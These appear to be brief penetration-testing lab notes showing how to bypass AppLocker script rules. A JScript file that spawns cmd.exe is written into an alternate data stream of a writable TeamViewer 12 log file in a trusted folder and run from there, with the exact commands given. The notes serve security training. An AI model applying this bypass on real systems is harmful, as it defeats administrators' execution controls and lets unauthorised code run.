
```
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");

```

1. Save as test.js but can't execute as Applocker scripting rules in place. But
2. Find a file in trusted location that writable and executable.
3. Write to that file to an alternate data stream.
4. Execute the file

***Teamviewer 12 example***

```
C:\Users\student>type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"

C:\Users\student>"C:\Program Files
(x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```